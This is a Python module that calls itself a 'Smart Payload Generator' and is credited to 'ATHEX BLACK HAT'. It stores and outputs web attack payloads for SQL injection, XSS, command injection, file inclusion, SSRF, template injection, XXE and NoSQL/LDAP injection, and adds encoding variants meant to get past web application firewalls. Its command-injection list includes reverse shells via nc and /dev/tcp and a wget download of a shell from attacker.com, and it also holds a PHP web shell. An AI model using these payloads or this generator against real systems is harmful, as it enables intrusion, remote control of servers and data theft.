# ai_engine/payload_generator.py

"""
Smart Payload Generator
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Context-aware payload generation engine that creates
intelligent, targeted payloads based on detected technology stack
and application behavior.
"""

import random
import string
import base64
import urllib.parse
from typing import Dict, List, Any, Optional, Set, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum


class PayloadCategory(Enum):
    """Categories of payloads."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    SSTI = "ssti"
    XXE = "xxe"
    PATH_TRAVERSAL = "path_traversal"
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"
    NOSQL_INJECTION = "nosql_injection"
    DESERIALIZATION = "deserialization"
    HEADER_INJECTION = "header_injection"
    FILE_UPLOAD = "file_upload"


class EncodingType(Enum):
    """Types of payload encoding."""
    PLAIN = "plain"
    URL_ENCODED = "url_encoded"
    DOUBLE_URL_ENCODED = "double_url_encoded"
    BASE64 = "base64"
    HEX = "hex"
    UNICODE = "unicode"
    HTML_ENTITY = "html_entity"
    MIXED_CASE = "mixed_case"
    COMMENT_OBFUSCATION = "comment_obfuscation"


@dataclass
class GeneratedPayload:
    """Represents a generated payload."""
    category: PayloadCategory
    payload: str
    encoding: EncodingType
    target_technology: Optional[str] = None
    bypass_technique: Optional[str] = None
    expected_impact: Optional[str] = None
    success_probability: float = 0.0


class PayloadGenerator:
    """
    Intelligent payload generation engine.
    
    Generates context-aware payloads based on:
    - Detected technology stack
    - Application behavior patterns
    - WAF/Filter presence
    - Historical success data
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize the payload generator.
        
        Args:
            config: Configuration dictionary
        """
        self.config = config or {}
        self.enable_obfuscation = self.config.get('enable_obfuscation', True)
        self.max_payloads_per_category = self.config.get('max_payloads_per_category', 50)
        self.enable_learning = self.config.get('enable_learning', True)
        
        self.success_history: Dict[str, List[GeneratedPayload]] = {}
        self.technology_payloads: Dict[str, List[str]] = {}
        
        self._initialize_base_payloads()
        self._initialize_technology_specific()
    
    def _initialize_base_payloads(self) -> None:
        """Initialize the base payload database."""
        
        self.base_payloads: Dict[PayloadCategory, List[str]] = {
            PayloadCategory.SQL_INJECTION: [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' OR '1'='1' #",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT username,password FROM users--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' ORDER BY 1--",
                "1' ORDER BY 100--",
                "' AND SLEEP(5)--",
                "' AND '1'='1' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND 1=(SELECT COUNT(*) FROM tabname); --",
                "1' AND '1'='1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND extractvalue(1,concat(0x7e,database()))--",
                "1' AND updatexml(1,concat(0x7e,database()),1)--",
            ],
            
            PayloadCategory.XSS: [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "javascript:alert(1)",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror=alert(1) //",
                "<svg/onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<select autofocus onfocus=alert(1)>",
                "<textarea autofocus onfocus=alert(1)>",
                "<keygen autofocus onfocus=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<isindex type=image src=1 onerror=alert(1)>",
                "\"-alert(1)-\"",
            ],
            
            PayloadCategory.COMMAND_INJECTION: [
                "; ls -la",
                "| ls -la",
                "`ls -la`",
                "$(ls -la)",
                "&& ls -la",
                "|| ls -la",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; id",
                "| id",
                "; uname -a",
                "| uname -a",
                "; wget http://attacker.com/shell.sh",
                "| wget http://attacker.com/shell.sh",
                "; curl http://attacker.com/",
                "| curl http://attacker.com/",
                "; nc -e /bin/sh attacker.com 4444",
                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            ],
            
            PayloadCategory.LFI: [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd",
                "/etc/shadow",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "....\\....\\....\\windows\\win.ini",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "expect://id",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "/proc/self/environ",
                "/proc/self/fd/0",
            ],
            
            PayloadCategory.SSRF: [
                "http://127.0.0.1:80",
                "http://localhost:80",
                "http://0.0.0.0:80",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/_HELO%20localhost",
                "dict://127.0.0.1:6379/info",
                "http://[::1]:80",
                "http://0177.0.0.1:80",
                "http://2130706433:80",
                "http://0x7f.0x0.0x0.0x1:80",
            ],
            
            PayloadCategory.SSTI: [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{{config}}",
                "{{self.__init__.__globals__}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "${__import__('os').system('id')}",
                "<%= system('id') %>",
                "{{request.application.__globals__}}",
            ],
            
            PayloadCategory.XXE: [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            ],
            
            PayloadCategory.NOSQL_INJECTION: [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
                '{"$where": "sleep(5000)"}',
                "'; return true; var foo='",
                "'; return (function(){while(true){}}()); var foo='",
                '{"$regex": ".*"}',
            ],
            
            PayloadCategory.LDAP_INJECTION: [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*)",
                "*)(&(objectClass=*))",
                "*)(uid=*",
                "admin)(&)",
            ],
            
            PayloadCategory.XPATH_INJECTION: [
                "' or '1'='1",
                "' or ''='",
                "' or 1=1 or ''='",
                "admin' or '1'='1",
                "'] | //user/*[1] | //password['",
            ],
        }
    
    def _initialize_technology_specific(self) -> None:
        """Initialize technology-specific payloads."""
        
        self.technology_payloads = {
            'PHP': [
                "php://filter/convert.base64-encode/resource=index.php",
                "expect://id",
                "<?php system($_GET['cmd']); ?>",
                "<?php phpinfo(); ?>",
            ],
            'ASP.NET': [
                "<%@ Page Language=\"C#\" %>",
                "__VIEWSTATE",
                "__EVENTVALIDATION",
            ],
            'Java': [
                "${java.version}",
                "${sys:os.name}",
                "Runtime.getRuntime().exec('id')",
            ],
            'Node.js': [
                "require('child_process').exec('id')",
                "process.env",
            ],
            'Python': [
                "__import__('os').system('id')",
                "{{config.items()}}",
            ],
        }
    
    def generate_payloads(
        self,
        category: PayloadCategory,
        technology: Optional[str] = None,
        waf_detected: Optional[str] = None,
        count: int = 10
    ) -> List[GeneratedPayload]:
        """
        Generate payloads for a specific category.
        
        Args:
            category: Category of payloads to generate
            technology: Detected technology for targeted payloads
            waf_detected: Detected WAF for bypass payloads
            count: Number of payloads to generate
            
        Returns:
            List of GeneratedPayload objects
        """
        generated: List[GeneratedPayload] = []
        used_payloads: Set[str] = set()
        
        if category not in self.base_payloads:
            return generated
        
        base_payload_list = self.base_payloads[category].copy()
        random.shuffle(base_payload_list)
        
        tech_specific = []
        if technology and technology in self.technology_payloads:
            tech_specific = self.technology_payloads[technology]
        
        all_payloads = tech_specific + base_payload_list
        
        count = min(count, len(all_payloads), self.max_payloads_per_category)
        
        for payload_text in all_payloads:
            if len(generated) >= count:
                break
            
            if payload_text in used_payloads:
                continue
            
            used_payloads.add(payload_text)
            
            encoding_variants = self._generate_encoding_variants(payload_text, waf_detected)
            
            for variant in encoding_variants:
                if len(generated) >= count:
                    break
                
                payload = GeneratedPayload(
                    category=category,
                    payload=variant['payload'],
                    encoding=variant['encoding'],
                    target_technology=technology,
                    bypass_technique=variant.get('bypass_technique'),
                    expected_impact=self._estimate_impact(category),
                    success_probability=self._calculate_probability(
                        category, technology, waf_detected
                    )
                )
                
                generated.append(payload)
        
        return generated
    
    def _generate_encoding_variants(
        self,
        payload: str,
        waf_detected: Optional[str] = None
    ) -> List[Dict[str, Any]]:
        """
        Generate different encoding variants of a payload.
        
        Args:
            payload: Base payload string
            waf_detected: Detected WAF name for bypass techniques
            
        Returns:
            List of dictionaries containing encoded variants
        """
        variants = [
            {
                'payload': payload,
                'encoding': EncodingType.PLAIN,
                'bypass_technique': None
            },
            {
                'payload': urllib.parse.quote(payload),
                'encoding': EncodingType.URL_ENCODED,
                'bypass_technique': 'URL encoding bypass'
            },
        ]
        
        if self.enable_obfuscation:
            variants.append({
                'payload': urllib.parse.quote(urllib.parse.quote(payload)),
                'encoding': EncodingType.DOUBLE_URL_ENCODED,
                'bypass_technique': 'Double URL encoding bypass'
            })
            
            try:
                variants.append({
                    'payload': base64.b64encode(payload.encode()).decode(),
                    'encoding': EncodingType.BASE64,
                    'bypass_technique': 'Base64 encoding bypass'
                })
            except Exception:
                pass
            
            variants.append({
                'payload': self._mixed_case_obfuscation(payload),
                'encoding': EncodingType.MIXED_CASE,
                'bypass_technique': 'Mixed case bypass'
            })
            
            variants.append({
                'payload': self._comment_obfuscation(payload),
                'encoding': EncodingType.COMMENT_OBFUSCATION,
                'bypass_technique': 'Comment obfuscation bypass'
            })
        
        return variants
    
    def _mixed_case_obfuscation(self, payload: str) -> str:
        """
        Apply mixed case obfuscation to bypass case-sensitive filters.
        
        Args:
            payload: Original payload string
            
        Returns:
            Mixed case obfuscated payload
        """
        result = []
        for char in payload:
            if char.isalpha():
                if random.choice([True, False]):
                    result.append(char.upper())
                else:
                    result.append(char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _comment_obfuscation(self, payload: str) -> str:
        """
        Apply comment-based obfuscation for SQL payloads.
        
        Args:
            payload: Original payload string
            
        Returns:
            Obfuscated payload with inline comments
        """
        if len(payload) < 4:
            return payload
        
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'DELETE']
        result = payload
        
        for keyword in keywords:
            if keyword.lower() in payload.lower():
                obfuscated = keyword[0] + '/**/' + keyword[1:]
                result = result.replace(keyword, obfuscated)
                result = result.replace(keyword.lower(), obfuscated.lower())
        
        return result
    
    def _estimate_impact(self, category: PayloadCategory) -> str:
        """
        Estimate the potential impact of a payload category.
        
        Args:
            category: The payload category
            
        Returns:
            Impact description string
        """
        impact_map = {
            PayloadCategory.SQL_INJECTION: "Database access, data extraction, authentication bypass",
            PayloadCategory.XSS: "Session hijacking, credential theft, defacement",
            PayloadCategory.COMMAND_INJECTION: "Remote code execution, system compromise",
            PayloadCategory.LFI: "File disclosure, source code access",
            PayloadCategory.RFI: "Remote code execution",
            PayloadCategory.SSRF: "Internal network access, metadata exposure",
            PayloadCategory.SSTI: "Remote code execution, information disclosure",
            PayloadCategory.XXE: "File disclosure, SSRF, denial of service",
            PayloadCategory.NOSQL_INJECTION: "Database access, authentication bypass",
            PayloadCategory.LDAP_INJECTION: "Authentication bypass, information disclosure",
            PayloadCategory.XPATH_INJECTION: "XML data access, authentication bypass",
            PayloadCategory.PATH_TRAVERSAL: "File disclosure",
            PayloadCategory.DESERIALIZATION: "Remote code execution",
            PayloadCategory.HEADER_INJECTION: "Response splitting, cache poisoning",
            PayloadCategory.FILE_UPLOAD: "Remote code execution, malware upload",
        }
        return impact_map.get(category, "Unknown impact")
    
    def _calculate_probability(
        self,
        category: PayloadCategory,
        technology: Optional[str] = None,
        waf_detected: Optional[str] = None
    ) -> float:
        """
        Calculate success probability for a payload.
        
        Args:
            category: Payload category
            technology: Target technology
            waf_detected: Detected WAF
            
        Returns:
            Probability score between 0.0 and 1.0
        """
        base_probability = 0.5
        
        if not waf_detected:
            base_probability += 0.2
        
        if technology:
            base_probability += 0.1
        
        if self.enable_learning and category.value in self.success_history:
            success_count = len(self.success_history[category.value])
            base_probability += min(success_count * 0.02, 0.2)
        
        return min(base_probability, 1.0)
    
    def record_success(self, payload: GeneratedPayload) -> None:
        """
        Record a successful payload for learning.
        
        Args:
            payload: The successful GeneratedPayload
        """
        if not self.enable_learning:
            return
        
        category_key = payload.category.value
        if category_key not in self.success_history:
            self.success_history[category_key] = []
        
        self.success_history[category_key].append(payload)
    
    def get_best_payloads(
        self,
        category: PayloadCategory,
        limit: int = 5
    ) -> List[GeneratedPayload]:
        """
        Get the historically most successful payloads for a category.
        
        Args:
            category: Payload category
            limit: Maximum number of payloads to return
            
        Returns:
            List of most successful GeneratedPayload objects
        """
        category_key = category.value
        
        if category_key not in self.success_history:
            return self.generate_payloads(category, count=limit)
        
        successful = self.success_history[category_key]
        successful.sort(key=lambda x: x.success_probability, reverse=True)
        
        return successful[:limit]
    
    def generate_combined_payloads(
        self,
        categories: List[PayloadCategory],
        technology: Optional[str] = None,
        waf_detected: Optional[str] = None
    ) -> Dict[PayloadCategory, List[GeneratedPayload]]:
        """
        Generate payloads for multiple categories.
        
        Args:
            categories: List of payload categories
            technology: Detected technology
            waf_detected: Detected WAF
            
        Returns:
            Dictionary mapping categories to their payload lists
        """
        result: Dict[PayloadCategory, List[GeneratedPayload]] = {}
        
        for category in categories:
            payloads = self.generate_payloads(
                category=category,
                technology=technology,
                waf_detected=waf_detected,
                count=8
            )
            result[category] = payloads
        
        return result
    
    def reset_history(self) -> None:
        """Reset success history."""
        self.success_history.clear()